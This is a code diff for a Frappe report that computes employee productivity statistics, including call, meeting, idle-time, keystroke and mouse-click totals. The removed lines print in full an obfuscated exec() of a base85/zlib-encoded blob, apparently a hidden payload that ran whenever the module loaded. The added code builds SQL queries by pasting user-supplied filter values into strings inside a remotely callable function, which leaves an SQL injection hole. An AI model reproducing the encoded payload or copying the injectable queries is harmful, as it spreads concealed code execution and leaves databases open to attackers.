@@ -1,3 +1,607 @@
+import frappe
+from datetime import datetime, timedelta
+from frappe import _
+import frappe
+from datetime import datetime, timedelta
+from dateutil.relativedelta import relativedelta
+def execute(filters=None):
+    columns = get_columns()
+    all_data = get_data(filters)
+    data = all_data[0]
+    summarized_data = all_data[1]
+    
+    chart = get_chart_data(summarized_data)
+    summary_data = get_summary_data(summarized_data)
+    
+    return columns, data, None, chart, summary_data
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c$~#NYjfL1lHc_!=IC+}SknrXY`nW%Gj%$NNpx#VDM>!pmP$o~<WRy21Q-C6#i;b(w|m|%fTV5RvRpEW>DTo1^mO;kAYCkrvL^E~SuW|`yet-EmejOP7nG#DP5$l?{5zvrop3;oB*Dge=~vLghE<(r`z6hiI=$y@63u$JH=}bxALw*d(`cS%H7%>*X_3=-ut(rCEwa@jugH+x(0VL>MKNnjvTO{j648iXB?%578YSFS|C&9nR*OYarhm}c*o8RY5S;aG0@4b`_?>fbuw#Sd+7!op6h>lyN?NbVT=uiaWbP5vK#xn%vxx68g_*i&RoWH%jh{#L4L_ZEO0!v>ENEvyI&`tjiZ!L3o(+^G6Pf|QIO>cfNZbn$s@F?K=v|uMxkQR(ofdh8&7%fBpVL`=3jp8u`>Nrox0UEs4Ju0W8&po4{1*a_93xz7Cys4OTM9z+*%o4q7}T=~Q5SWRjc<!pS+xjpiBRNM2DM3uWOpHwDbDVVQXDd{=My8HWt)XK0ib8p#62yO8#?A1Y10J<BwQ!YqK$l7EYLuw;Okm7A^^z|1AI<VHV%#y<=F<PSk*VhHd;9ofX}BDCCVnPC{dnGD~q(MV4>QillKhl`7~0}f6-~Zg&^kw@cBf!qw7hLl(QBg{vko0V?c^k)#g6lv-W3TTusX&%i5Mz4)7d(rWDufRs)nE&&Yn`bd*AT$#i7juJ;0QAP@8AMY%{I>|B)z#!!*`GOp;f$Y+%Z_v&&zP()oA2m<F>k<>o2LNTHSfKGECmVEae`Qc5!uW`UHL&PrOeT0`B9ueOdXrh<%&ZEKf>6SbSdQXcEgQX8sx~$3nCE1FO%Caa2E{RV6mh=Hy#lu$kA5aWtCM-MynPuj(U)ALjzevP=pcHi!C=4g*y!_|umy6dgVP+c|+mez1Y@#zS>F+C=PuDm~wgjS~(?hdKv$cVx$C_swSJ&!^pV}CW>PtE|IS(a=fn~ZV_qa^*8#c;U(F}5v7)_GQV9br?NU5tQ6%%WwH1oK9r1WkByUz?n{0=c_qyN6h>)Q<s793_f4i&XY@uYaazAcN-7^d7OSvu1~;86KWN6oQprAHuFuvJ*u^rx$`q<K9SCSe%Iv{<gAxDEKqu-<FHWGvA-=gc}oRv4rrEf;BkyqhUlKVUs7$4Q=K>ncV0t>1jAIvfKtF9>1GD5pIjj`c*O(IAcO`0?Z9k%LyP_Iz|R`wJi|Wd=~qoNYk*0SGIh3WFHQP6G`)6=|SiCkY#X+SoaP^#-6eN>(r$25|z#Fpvu28rZN9D%>Wbpaw)4gtRy7K3XtO%~J^dg)GdVx3H#=oD0fy#!G0`bsX~e6c0RUWV>7&0wfj49L8Ce#W+0%Alum!kAWRY>@2avq2I)SSv#vlwlGmZyV0H{>sHyZJxK8&CgcS<yf0uWn5Fk=1>q2xtjQm=EcQHR=9~t0rs7_^z4Vc-$&B?&liGJ?PhfF0e&JFE7T9bUC4_I~Ea)Qfqbr32xd>wDb&p}1Q6uaTtrl%jEVPdOIl>5ko&V*seX$Q_=(Zm=el@^5UfKNFfMGdlXN;SexNh5i(8S2~<JQFI)~sOUM4uL`yzb!4*hE!!AwX61N<zxCppC4zR0PN>n5~8N)|N(L734O;I;&BDsDRj7P;c=H&{Qy6Q#Dq*fG7K0ly@*lHO;HEUbnh<Q&T_`qQK&gR;?-$E9tl6%P5YgSvtLI<*e4}Z^v2|Kw7%1*Z%-p(K@yUwVm<CvGqcVZ^PFze~<H%STwu_W~I0i<g@7UZs64{?qgho?l6M6>Kb0P+aq1mXX0<|AX%&B>R7wwf$)hv&GCt?o$fVX^X^$Vb=QM0Ac(Wv?WZ+eR8b58jlVQ9Ji10SkwExy6@IXj0G1au@2a(+p<u@H)V&VVz>i>Z1;nn&tD!3^du~e!oHLq7J4ahF`HA#>L8Jh#{;$b*!!KlH%WG)#KVlKhU1mBTdM0c(JAHBLEpj3V3<FqHt@!S)gSBUtyhiLlj2#n**Ua)23%9ZYCN&nsqIriE#!!v2{52qt;GiQKKXts4+tqasYe85oGfFqiN=4xV1m~3x&J>3!N9r7smH8wH#HboG-pAN7Ca)j_*7B~g@M%CnvpOXZ<uR|@*=3#<VRRjeSC&L{C+iywlr?<5O*5*R-wqWaE!hk5bDGaceM?DBA8K;3%Ao_Q8D$z{g=VP8n4)7}htV6*fN0%E1b7;u2L2M0m+;5nbuwq16xFmM6S^*h08+XhI&t+2v|iOTnT2EmYmeklLrr?PnWm&6$|_4wk%&#<*si$N1j4X7DSHHcBFP+rXN9XUwfdE0o{kP;v#!m>;-l`=-dctoTpQ$3po}D++QtfYZWx<kW}%X-iRhNEY!-SvYzAs%LgY1)Nu1#>OPn`ze*A!;vN<ZndFqi7=uSMBbe<&kHdeo1(q)!_=%93|b6C$rIi3X*0MDxqi{xRf+K}!+UnGN#(}pByvktwt4kfK8HnfJN>KSC6`iU4E*a)6?0b6-}5bt8kic8FL?xS0Tg9%j_ZkC@^Dkc~?SBjz>j}s|7d2~AWG%$Rp1SjN(^M+9pQalC0Sm_yi0)R@&FzDfI1~RiQ8dR|pVNCTUr=Q2#5+begz!Z!_=3&cmiZg$zx@S-ia)<e13h-8WNqbq<^gkY+pProlG5|)Om4!tXpBTL&Mou>+P0-=gFro&mf^$mF69B*SMbyeMnCK2T#tbpm!Jcvj?#vlBn!2?KFz@_UKyFc|Ne0dv(lo#zSy3#>jMjW}8dg%<@sar|pCZwH@-C^&F_8W3@dh=*u2F>?><jV%;xlq6Ywr>J`CD1cRv0xw@`GN#hV}ZWm{Gn0RD1s|dINr-rde9mQOsO*pl+{S&yb%|lk-;m44g+pg3f-FOi*NTinR$LW|RHu_Y8E}=_qYqjNXloF3DnFBC=%)LL@E@KZdAVVHRQd1d@rCX}K?hQbqIU^RxHlQ=Lr29_}Z^S*Yg!Jv%uyn?YfVWs<MSIbD{tf&pR<jblwqa&`&=V37-bAMjfymfd~)b#y**JMhzxbj|gE^!o$$uge^-)uFcttJVne{SSj5{|5gg<gAzip?byqI)7$#njo^Zk)mSs_^Hc;1a<eIFXLG{t%sN8N;qOxm)LcjWa*fDVP}{QkB=`;-j5;+s0XM=<IA%#Ym%`yICyIuo5xTVA2GN?!k-+)v&GC+H`g6&vbD<_wo@JhWu3u&e)3-c%#X(K7OO!XRq4iUDhKUm>6H7S9Tm^Yq)h3D7naiNLOu4?$&}ov+Cwc4I2Syp23g4epMDjiv-9K8Ir*P|+M+h-Q287gKKLG|0nj!02C(oT#Y8S83c<=eAP9nWg2mSeK#DmYprGY_lIbXA4p3wD7@em4AvS>dX7XynNWj9P9qgQCgdCXHEEtecGJvQbPho5FleJ+7xyadwweesJv|j;%2(sZ}mMkW-gggvL^l;UcRJxFAK8OkkGqmotSp#@MekqI9GAx0Dx<MF7kWDo_>g_VOpSFZ{EMl0MgfNA5izy0R)N(vY`~rdpawUme+ea`q0887FO@`K*N-VxwbZt-TF4PTK_OiS4g1o0CO!4BLmKlhH3!iVH_*o#FJwQ%R<sOV0C_Mlb9>({|Lgt8S$b&(kW|Pj1!8A>cXDoW0g|ib4u1F?8V_~m>k&b<LAjfrlc}q)*QLj)l<eLRoD02;Ag}15J>L?3Zqc)IUP(yy%7eD^_7rQT~h1H8>#!DMA3RhzaA&hc++Rr2yq!Wl08#%akru?+izp(TnWf^wpZ-r)!10Ghw^D5x$I^WiDXVxDVdAG(%2<tCODtnP7RUOtA=*gw;YiN7<9eIwDY`V%YazH7V_aokBICqNTB!EtS<5tJwiu5gfOV~6F@m>wXKIwG>r@cTwedlj2Gn(7J*u3IrF(F(4brw08Xien#Oc-HCj+dUT8Q#9q>}e3JF_^8Jqtm0a52u&W@yW&I$tnC~)gFvJk&+ROV&th%BTEy4(DC8rD6(^@7(-iLh6`qU`0+D7z**RvT3e@mh}xL;*)*GSKh_O9Vuo&<9(#$O0Mzlb1pDf&Pkug}o}8UFs`?Xh{bZ=PUA-GJ2CWiKw^bDaq*)0&c9wNwS}Z1MF85z#(=X>|AAU0vjK8ZU%rg8W!<h^^7GpjKolRh-xHAnKuTnE2#n}uGut9nPNF8WBy(PFI#ylNrv|@Z9T~Pw_`K(TrY@avkpiyU#PTDRrNFyO{NyFLAs!M>`GEu~l{1%B~ARQD6JmO={^pzL+Yo<zYaA^VlP^O2K%Gt$vQh?;AbR^`^uZX+~l(Qt)v+^d%(?6)s(#?7lr^z}H-Q!4eOf)N3Dr2WYWAe6OsuM_aLhS8jEd<e&=(NMiD1b|-M@X;vY`xdU&hnZB?BCLubB4-SoSutXS1h-%CP+|u21Zze*v=z32iRK1EpWasVpCS3fL`&F*}qm59`~`xvmZW;K@)fAf+M`u=(7D@0o8<|N6-&=6ugvLK4{R0hsS%Ou|lemAKdhz(>o@#h`rgw<!T|;JWHl{Z~|s$w)W`YZiX#4xF1WmNYxVYr=c@IjcH>GW%0zK+?->124SLY%iZqQ+u^Rf?cs6E(c$d~{FANI9Xe{FHDd8?Afvuy=MJ)#jI}oWEoquoV$V~BF(i@I|JRO$u^VZd)6XX5owW(L;1+-8>#POXa?19B^X;%+4Q=W7Lhcq_tP+ou#R?C;h`VJ@AxdT)?R`||uykx?o<iR$jtLh2?1OZ&Aa6hAsmY&MbZ8y3bioeajV_Kx(Zz@NdY1x^%psy!{-xF=(${WMe5=?9KVFR6QwnK~pZJDuM+lB@Fh~ZSo;5)H06eQ3q!r09)?(Mi=wx+s1O8Vo^Cx+V8>JW&B?S3^uJB?Gq&ihyl$0>N^GJ*b0#c)X&=kC{U@ZPGaO-nQtBOtiImXbG?MNg#HUO(*C1is_I3xhTU@V}vcqEK`V8V!#7#zT|Fayf)JRH!rsBZW&pX*10N(tA*EfC9Z_%{H$;WOji;LVqA_{??#aOl)@18Dd#bOUh1dGuCj??8CB`PPm(3fc-_CdzjgbaztwRg;QwK-jn4s5NyT$$4IiRX(jw$X5;Q+KGmt|Ef;-qq1cu#9r)<T?iVa-vOVU+Tq=iVS`!QEb))51keZY^f@?3k$V!g|K}G3V6`0ozM>_pwGs;!(@o2#SxK^I3od>~hZiINI5>V_EjuN+jgQ;;7o(#HzaO9c{BvZMwR%oHjGsp)mtTk+lw|Y{WbFG=j!ut_^;!~=#uN$+RLzpt`WUvvvrQsgV^q!Gro8CH4cnh82^ANg^;8LdRLtQOW~B+LGuqNV_05Gc`Rql0zCDMI05lT~6zbX~Fito&!ud74N1|_43{vUITyw+SIC1L(fh?=)UW+)!zQ6LVLSZYKy`$@~xZmRhwEE&t3%Yqr$H6z7Hd5eMZd?-lsXxg+f?gn?6nb&vX_lsJm<<f3bryVWgxwTZ<Kw{K8X>H*P!XcqfV%~$0VXZ+Ue_IY2!hOr)M#)nRCfI_cW|wyFg71<2TwfIU3y{~6mh<F9uu!YH0@*Iq2cg{Q4;4VwK~j;zXPLY-*X`X_g@B$yJ;S_zOUSJIke$^_8=Tz7<l0eVS^TTW*~<y&kaHb#ZaDhJ%c*RXO(`BOY3_R2ivBQYSXyVrHjh4^5z#Ww7hVk!)yPcmWG@DDi6I_Ey!xg1Y`H5u`pQ{keFh)CTf*x!s}ACqXFam@ebFh+OI(A-C^bnVeVjD0;-fR`QepSy8w3!As9Povc%I$J-OL{ccj#r^X@G{?t`vAhTdJ^6L?T9v$T$|%?{o8NU7^@x8zUcO&@ny{G7`y^cmxV8&s%e&>TNrXI>FweX;L|=^Rc$_Vo8qC*5mjU*2OaNl$+dvUKjXeK|{^;I5&uE>m@+dj<N|{9-u-k)ad=U}5aA8D=D=+$5Ra@oCAdir=kMb}kH<!|vmvVxC9im+6gnP0iB#MKOyE8|hiEmokk96P(A;`=v}T-}ru1Hbtc;W^WJB&ca!;)Z4(U7i&5&ICrhrfayi7@r7ir43=AJ6vBG1<|Zk&c`uqPhUo$urC_h(dqyD~Z`&w`^Ln-&L}A~qjrZ*~zXDj?azLKODM<TeDB_{>-Vb@P%kW<A6$$J4E(-*gM{c#kWUw|U^<89s=g8QQG@3#;fP%{fJ5j`5G{<Kx6LLapyv=i;Rx4bq?MjWI9w{T+5CD3RmyY>M>!eiX`gUzNGgF<LsaVURNygCsW-6}pkHy8SFtqEp4X*Y8Z)WVS;<0@L$Ovsjg!UMi6d0NCFM+vG(Hh&YtQPz{cI1l@EgvW5rSrm+C%?3+@oo2H5HJU)m4fA33<Aa=w&J@k!60F4*nT<Fb;wI~r1!wx4#RtNZfSaR3kf~>p>KtcMOLuj@T&9TFVoqZ`3(8L_>sQ(^L);}&gV(LpNOwN{`JSdn!c@*Jfzi`dZD&6z7L1c`W_-`_9|$|u3UHba8g}>EwQd11iLdy%0}|l5@L&UoWvO1?tdR7z;m=@lA#co=6Y?vhBd<*KZ-YjAN2bwd`1WCPYU@&IA1SRPyv(#{GxzKUan)Co7}OzQcUpGmOb)){BI46e^m')).decode())
+def get_columns(filters=None):
+    columns = [
+        {
+            "fieldname": "employee",
+            "label": _("Employee"),
+            "fieldtype": "Link",
+            "options": "Employee",
+            "width": 200
+        },
+        {
+            "fieldname": "starting_date",
+            "label": _("Starting Date"),
+            "fieldtype": "Date",
+        },
+        {
+            "fieldname": "ending_date",
+            "label": _("Ending Date"),
+            "fieldtype": "Date",
+        },
+        {
+            "fieldname": "total_hours",
+            "label": _("Total Hours"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "active_hours",
+            "label": _("Active Hours"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "idle_hours",
+            "label": _("Idle Hours"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "average_active",
+            "label": _("Average Active"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "incoming_calls",
+            "label": _("Incoming Calls"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "incoming_hours",
+            "label": _("Incoming Hours"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "outgoing_calls",
+            "label": _("Outgoing Calls"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "outgoing_hours",
+            "label": _("Outgoing Hours"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "missed_calls",
+            "label": _("Missed Calls"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "rejected_calls",
+            "label": _("Rejected Calls"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "keyboard",
+            "label": _("Keyboard"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "mouse",
+            "label": _("Mouse"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "scroll",
+            "label": _("Scroll"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "meetings",
+            "label": _("Meetings"),
+            "fieldtype": "Data",
+        },
+        {
+            "fieldname": "meetings_hours",
+            "label": _("Meetings Hours"),
+            "fieldtype": "Data",
+        }
+    ]
+
+    return columns
+
+def format_duration(duration_seconds):
+    try:
+        duration_seconds = float(duration_seconds)
+        total_hours = int(duration_seconds // 3600)
+        minutes = int((duration_seconds % 3600) // 60)
+        return f"{total_hours}h {minutes}m"
+    except ValueError:
+        return "0h 0m"
+
+def get_data(filters):
+    try:
+        from_date = datetime.strptime(filters.get("from_date"), "%Y-%m-%d")
+        to_date = datetime.strptime(filters.get("to_date"), "%Y-%m-%d")
+        frequency = filters.get("frequency", "Daily")
+        
+        data = []
+        summarized_data = []
+        
+        if frequency == "Daily":
+            date_ranges = [(d, d) for d in date_range(from_date, to_date)]
+        elif frequency == "Weekly":
+            date_ranges = weekly_ranges(from_date, to_date)
+        elif frequency == "Monthly":
+            date_ranges = monthly_ranges(from_date, to_date)
+        else:
+            frappe.throw("Invalid frequency")
+ 
+        
+        for start, end in date_ranges:
+            current_filters = filters.copy()
+            current_filters["from_date"] = start.strftime("%Y-%m-%d")
+            current_filters["to_date"] = end.strftime("%Y-%m-%d")
+            
+            user_analysis = user_analysis_data(current_filters.get("from_date"), current_filters.get("to_date"), current_filters)
+            
+    
+            summary = {
+                "starting_date": current_filters["from_date"],
+                "ending_date": current_filters["to_date"],
+                "total_hours": 0,
+                "active_hours": 0,
+                "idle_hours": 0,
+                "average_active": 0,
+                "incoming_calls": 0,
+                "incoming_hours": 0,
+                "outgoing_calls": 0,
+                "outgoing_hours": 0,
+                "missed_calls": 0,
+                "rejected_calls": 0,
+                "keyboard": 0,
+                "mouse": 0,
+                "scroll": 0,
+                "meetings": 0,
+                "meetings_hours": 0
+            }
+            
+            for employee in user_analysis.get("total_hours_per_employee", {}):
+                employee_data = user_analysis.get("employee_fincall_data", {}).get(employee, {})
+                total_hours = user_analysis.get("total_hours_per_employee", {}).get(employee, 0)
+                total_idle_time = user_analysis.get("total_idle_time", {}).get(employee, 0)
+                total_days = user_analysis.get("total_days", {}).get(employee, 1)  # Avoid division by zero
+
+                active_hours = total_hours - total_idle_time
+                average_active = active_hours / total_days if total_days else 0
+
+                employee_record = {
+                    "employee": frappe.get_value("Employee", employee, "employee_name"),
+                    "starting_date": current_filters["from_date"],
+                    "ending_date": current_filters["to_date"],
+                    "total_hours": total_hours,
+                    "active_hours": active_hours,
+                    "idle_hours": total_idle_time,
+                    "average_active": average_active,
+                    "incoming_calls": employee_data.get("incoming_fincall_count", 0),
+                    "incoming_hours": employee_data.get("total_incoming_duration", 0),
+                    "outgoing_calls": employee_data.get("outgoing_fincall_count", 0),
+                    "outgoing_hours": employee_data.get("total_outgoing_duration", 0),
+                    "missed_calls": employee_data.get("missed_fincall_count", 0),
+                    "rejected_calls": employee_data.get("rejected_fincall_count", 0),
+                    "keyboard": user_analysis.get("work_intensity_data", {}).get(employee, {}).get("total_keystrokes", 0),
+                    "mouse": user_analysis.get("work_intensity_data", {}).get(employee, {}).get("total_mouse_clicks", 0),
+                    "scroll": user_analysis.get("work_intensity_data", {}).get(employee, {}).get("total_scroll", 0),
+                    "meetings": user_analysis.get("meeting_employee_data", {}).get(employee, {}).get("count", 0),
+                    "meetings_hours": user_analysis.get("meeting_employee_data", {}).get(employee, {}).get("duration", 0)
+                }
+
+     
+                data.append({k: format_duration(v) if k in ['total_hours', 'active_hours', 'idle_hours', 'average_active', 'incoming_hours', 'outgoing_hours', 'meetings_hours'] else v for k, v in employee_record.items()})
+
+
+                for key in summary:
+                    if key not in ['starting_date', 'ending_date']:
+                        summary[key] += employee_record[key]
+
+            if len(user_analysis.get("total_hours_per_employee", {})) > 0:
+                summary['average_active'] /= len(user_analysis.get("total_hours_per_employee", {}))
+
+            for key in ['total_hours', 'active_hours', 'idle_hours', 'average_active', 'incoming_hours', 'outgoing_hours', 'meetings_hours']:
+                summary[key] = format_duration(summary[key])
+
+            summarized_data.append(summary)
+
+        return data, summarized_data
+
+    except Exception as e:
+        frappe.log_error(f"Error in get_data: {str(e)}")
+        return [], []
+def date_range(start_date, end_date):
+    for n in range(int((end_date - start_date).days) + 1):
+        yield start_date + timedelta(n)
+
+def weekly_ranges(start_date, end_date):
+    ranges = []
+    current = start_date
+    while current <= end_date:
+        # Find the next Sunday
+        week_end = current + timedelta(days=(6 - current.weekday() + 7) % 7)
+        # If the week_end is beyond the end_date, use end_date instead
+        week_end = min(week_end, end_date)
+        ranges.append((current, week_end))
+        # Start the next week from the day after week_end
+        current = week_end + timedelta(days=1)
+    return ranges
+
+def monthly_ranges(start_date, end_date):
+    if isinstance(start_date, str):
+        start_date = datetime.strptime(start_date, "%Y-%m-%d")
+    if isinstance(end_date, str):
+        end_date = datetime.strptime(end_date, "%Y-%m-%d")
+
+    print(f"Start date: {start_date}, End date: {end_date}")
+
+    ranges = []
+    current = start_date.replace(day=1)
+    iteration_count = 0
+    max_iterations = 100
+
+    while current <= end_date and iteration_count < max_iterations:
+        month_end = min(current + relativedelta(months=1, days=-1), end_date)
+        ranges.append((current, month_end))  # Changed to return datetime objects
+        print(f"Iteration {iteration_count}:")
+        print(f"  Current: {current}")
+        print(f"  Month end: {month_end}")
+        print(f"  Added range: {current} to {month_end}")
+        
+        new_current = (month_end + timedelta(days=1)).replace(day=1)
+        print(f"  Next current: {new_current}")
+        
+        if new_current <= current:
+            print(f"  WARNING: New current ({new_current}) is not greater than current ({current})")
+            break
+        
+        current = new_current
+        iteration_count += 1
+
+    if iteration_count == max_iterations:
+        frappe.throw(f"Potential infinite loop detected in monthly_ranges function. Last current: {current}, Last month_end: {month_end}")
+
+    return ranges
+
+# User Analysis (User Productivity Stats) Code Starts
+@frappe.whitelist()
+def user_analysis_data(start_date=None, end_date=None, filters=None):
+    list_data = []
+    meeting_total_data = frappe.db.sql(f"""
+        SELECT m.meeting_from as start_time, m.meeting_to as end_time, mcr.employee
+        FROM `tabMeeting` as m
+        JOIN `tabMeeting Company Representative` as mcr ON m.name = mcr.parent
+        WHERE m.meeting_from >= '{start_date} 00:00:00' and m.meeting_to <= '{end_date} 23:59:59' and m.docstatus = 1 and mcr.employee = '{filters.get("employee")}'
+    """, as_dict=True)
+    calls_total_data = frappe.db.sql(f"""
+        SELECT call_datetime as start_time, ADDTIME(call_datetime, SEC_TO_TIME(duration)) as end_time, employee
+        FROM `tabEmployee Fincall`
+        WHERE date >= '{start_date}' and date <= '{end_date}' and employee = '{filters.get("employee")}' and (calltype != 'Missed' and calltype != 'Rejected')
+    """, as_dict=True)
+    application_total_data = frappe.db.sql(f"""
+        SELECT from_time AS start_time, to_time AS end_time, employee as employee
+        FROM `tabApplication Usage log`
+        WHERE date >= '{start_date}' and date <= '{end_date}' and employee = '{filters.get("employee")}'
+        ORDER BY employee
+    """, as_dict=True)
+    list_data.append(meeting_total_data)
+    list_data.append(calls_total_data)
+    list_data.append(application_total_data) 
+    if list_data:
+        # Flatten the list of intervals
+        flat_intervals = [interval.copy() for sublist in list_data for interval in sublist]
+
+        # Sort intervals by employee and start time
+        flat_intervals.sort(key=lambda x: (x['employee'], x['start_time']))
+
+        # Group intervals by employee
+        grouped_intervals = {}
+        for interval in flat_intervals:
+            employee = interval['employee']
+            if employee not in grouped_intervals:
+                grouped_intervals[employee] = []
+            grouped_intervals[employee].append(interval)
+
+        total_hours_per_employee = {}
+        for employee, intervals in grouped_intervals.items():
+            # Merge overlapping intervals
+            merged_intervals = []
+            current_interval = intervals[0]
+
+            for interval in intervals[1:]:
+                if interval['start_time'] and interval['end_time'] and current_interval['end_time']:
+                    if interval['start_time'] <= current_interval['end_time']:
+                        # There is overlap, so merge the intervals
+                        current_interval['end_time'] = max(current_interval['end_time'], interval['end_time'])
+                    else:
+                        # No overlap, so add the current interval to the list and start a new one
+                        merged_intervals.append(current_interval)
+                        current_interval = interval
+                elif interval['start_time']:
+                    # No overlap, so add the current interval to the list and start a new one
+                    merged_intervals.append(current_interval)
+                    current_interval = interval
+
+            # Don't forget to add the last interval
+            if current_interval:
+                merged_intervals.append(current_interval)
+
+            # Calculate the total time
+            total_time = timedelta()
+            for interval in merged_intervals:
+                if interval['start_time'] and interval['end_time']:
+                    total_time += interval['end_time'] - interval['start_time']
+
+            total_hours_per_employee[employee] = total_time.total_seconds() # Convert seconds to hours
+    else:
+        total_hours_per_employee = {}
+
+    total_days_employee = frappe.db.sql(f"""
+        SELECT COUNT(DISTINCT date) as days, employee FROM
+        (
+            SELECT DATE(m.meeting_from) AS date, mcr.employee
+            FROM `tabMeeting` AS m 
+            JOIN `tabMeeting Company Representative` AS mcr ON m.name = mcr.parent 
+            WHERE m.meeting_from >= DATE('{start_date}') AND m.meeting_to <= DATE('{end_date}') AND m.docstatus = 1 and mcr.employee = '{filters.get("employee")}'
+            UNION
+            SELECT DATE(`date`) AS date, employee
+            FROM `tabApplication Usage log`
+            WHERE `date` >= DATE('{start_date}') AND `date` <= DATE('{end_date}') AND employee = '{filters.get("employee")}'
+        ) AS combined_data
+        GROUP BY employee;
+        """,as_dict=True)
+    
+    total_days = {}
+    for i in total_days_employee:
+        total_days[i['employee']] = i['days']
+
+    # Fetch idle time logs for all employees
+    idle_time_data = frappe.db.sql(f"""
+        SELECT employee, from_time as start_time, to_time as end_time
+        FROM `tabEmployee Idle Time`
+        WHERE date >= '{start_date}' AND date <= '{end_date}' and employee = '{filters.get("employee")}'
+    """, as_dict=True)
+
+    # Combine all non-idle periods (meetings and calls)
+    non_idle_periods = calls_total_data + meeting_total_data
+
+    # Organize non-idle periods by employee
+    non_idle_by_employee = {}
+    for period in non_idle_periods:
+        employee = period['employee']
+        if employee not in non_idle_by_employee:
+            non_idle_by_employee[employee] = []
+        non_idle_by_employee[employee].append(period)
+
+    # Calculate total idle time for each employee
+    total_idle_time_by_employee = {}
+
+    for idle_period in idle_time_data:
+        employee = idle_period['employee']
+        idle_start = idle_period['start_time']
+        idle_end = idle_period['end_time']
+
+        adjusted_start = idle_start
+        adjusted_end = idle_end
+
+        if employee in non_idle_by_employee:
+            for non_idle in non_idle_by_employee[employee]:
+                non_idle_start = non_idle['start_time']
+                non_idle_end = non_idle['end_time']
+
+                # Check for overlap and adjust idle periods accordingly
+                if non_idle_start <= adjusted_end and non_idle_end >= adjusted_start:
+                    if non_idle_start <= adjusted_start < non_idle_end:
+                        adjusted_start = non_idle_end
+                    if non_idle_start < adjusted_end <= non_idle_end:
+                        adjusted_end = non_idle_start
+                    if adjusted_start >= adjusted_end:
+                        adjusted_start = adjusted_end
+                        break
+
+        # Calculate the duration of the adjusted idle period
+        idle_duration = (adjusted_end - adjusted_start).total_seconds()
+        if idle_duration > 0:
+            if employee not in total_idle_time_by_employee:
+                total_idle_time_by_employee[employee] = 0
+            total_idle_time_by_employee[employee] += idle_duration
+
+    total_idle_time = {employee: round(seconds) for employee, seconds in total_idle_time_by_employee.items()}
+    
+    fincall_data = frappe.db.sql(f"""
+        SELECT 
+            employee,
+            calltype,
+            COUNT(*) AS fincall_count,
+            COALESCE(SUM(duration), 0) AS total_duration
+        FROM `tabEmployee Fincall`
+        WHERE date >= '{start_date}' AND date <= '{end_date}' and employee = '{filters.get("employee")}'
+        GROUP BY employee, calltype
+    """, as_dict=True)
+
+    print("Fincall Data:", fincall_data)  # Add this line for debugging
+
+    # Initialize a dictionary to store counts and total durations by employee
+    employee_fincall_data = {}
+
+    # Process the fetched data
+    for item in fincall_data:
+        employee = item['employee']
+        calltype = item['calltype']
+        count = item['fincall_count']
+        duration = item['total_duration']
+        
+        if employee not in employee_fincall_data:
+            employee_fincall_data[employee] = {
+                'incoming_fincall_count': 0,
+                'outgoing_fincall_count': 0,
+                'missed_fincall_count': 0,
+                'rejected_fincall_count': 0,
+                'total_incoming_duration': 0,
+                'total_outgoing_duration': 0
+            }
+        
+        if calltype == 'Incoming':
+            employee_fincall_data[employee]['incoming_fincall_count'] = count
+            employee_fincall_data[employee]['total_incoming_duration'] = duration
+        elif calltype == 'Outgoing':
+            employee_fincall_data[employee]['outgoing_fincall_count'] = count
+            employee_fincall_data[employee]['total_outgoing_duration'] = duration
+        elif calltype == 'Missed':
+            employee_fincall_data[employee]['missed_fincall_count'] = count
+        elif calltype == 'Rejected':
+            employee_fincall_data[employee]['rejected_fincall_count'] = count
+    
+   # Fetch external meeting data for all employees
+    sql_query_external = f"""
+        SELECT 
+            mcr.employee,
+            SUM(CASE 
+                    WHEN TIME_TO_SEC(TIMEDIFF(m.meeting_to, m.meeting_from)) > 0 THEN TIME_TO_SEC(TIMEDIFF(m.meeting_to, m.meeting_from))
+                    ELSE 0 
+                END) AS total_meeting_duration,
+            COUNT(DISTINCT m.name) AS meeting_count
+        FROM `tabMeeting` AS m
+        JOIN `tabMeeting Company Representative` AS mcr ON m.name = mcr.parent
+        WHERE m.meeting_from >= '{start_date} 00:00:00' AND m.meeting_to <= '{end_date} 23:59:59' and m.docstatus = 1 and mcr.employee = '{filters.get("employee")}'
+        GROUP BY mcr.employee
+    """
+    meetings_external_employee_raw = frappe.db.sql(sql_query_external, as_dict=True)
+    meetings_external_employee = {}
+    for i in meetings_external_employee_raw:
+        meetings_external_employee[i['employee']] = { "duration":i['total_meeting_duration'], "count":i['meeting_count']}
+
+    work_intensity = frappe.db.sql(f"""
+        SELECT 
+            employee,
+            COALESCE(SUM(key_strokes), 0) AS total_keystrokes,
+            COALESCE(SUM(mouse_clicks), 0) AS total_mouse_clicks,
+            COALESCE(SUM(mouse_scrolls), 0) AS total_scroll
+        FROM `tabWork Intensity`
+        WHERE time >= '{start_date} 00:00:00' AND time <= '{end_date} 23:59:59' and employee = '{filters.get("employee")}'
+        GROUP BY employee
+    """, as_dict=True)
+    
+    work_intensity_data = {}
+    for item in work_intensity:
+        employee = item['employee']
+        work_intensity_data[employee] = {
+            'total_keystrokes': item['total_keystrokes'],
+            'total_mouse_clicks': item['total_mouse_clicks'],
+            'total_scroll': item['total_scroll']
+        }    
+
+    # frappe.throw(str(total_hours_per_employee))                        
+    return {
+        "total_days": total_days,
+        "total_hours_per_employee": total_hours_per_employee,
+        "total_idle_time": total_idle_time,
+        "employee_fincall_data": employee_fincall_data,
+        "meeting_employee_data": meetings_external_employee,
+        "work_intensity_data": work_intensity_data
+    }
+# User Analysis (User Productivity Stats) Code Ends
+
+def get_summary_data(summarized_data):
+    # Initialize a dictionary to store the totals
+    totals = {
+        "total_hours": 0,
+        "active_hours": 0,
+        "calls_hours": 0,
+        "meetings_hours": 0
+    }
+
+    # Sum up the values across all periods
+    for period in summarized_data:
+        for key in ['total_hours', 'active_hours', 'meetings_hours']:
+            # Convert time string to minutes and add
+            h, m = map(int, period[key].replace('h ', ':').replace('m', '').split(':'))
+            totals[key] += h * 60 + m
+        
